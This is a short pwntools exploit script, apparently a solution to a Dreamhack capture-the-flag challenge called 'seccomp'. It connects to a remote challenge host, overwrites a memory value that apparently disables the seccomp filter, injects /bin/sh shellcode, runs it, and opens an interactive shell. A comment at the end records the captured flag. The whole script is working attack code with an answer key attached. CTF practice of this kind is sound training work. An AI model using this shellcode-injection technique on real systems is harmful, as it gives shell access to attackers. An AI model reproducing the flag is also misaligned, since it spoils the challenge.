from pwn import * 

local = 0

# p = process(["strace","-i","./seccomp"])

if local == 1:
    p = process("./seccomp")
    puts_offset = 0x80a30
    one_gadget = [0x4f365,0x4f3c2,0x10a45c]
else :
    p = remote("host1.dreamhack.games",8474)
    puts_offset = 0x6f690
    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]


# context.log_level = 'debug'

context.arch = "x86_64"


p.sendlineafter(">",str(3))
p.sendlineafter("addr",str(0x602090))

p.sendlineafter("value",str(2))

payload = ""
payload += asm(shellcraft.linux.sh())

p.sendlineafter(">",str(1))
p.sendlineafter("shellcode",payload)

pause()
p.sendlineafter(">",str(2))

p.interactive()

#DH{22b3695a64092efd8845efe7eda784a4}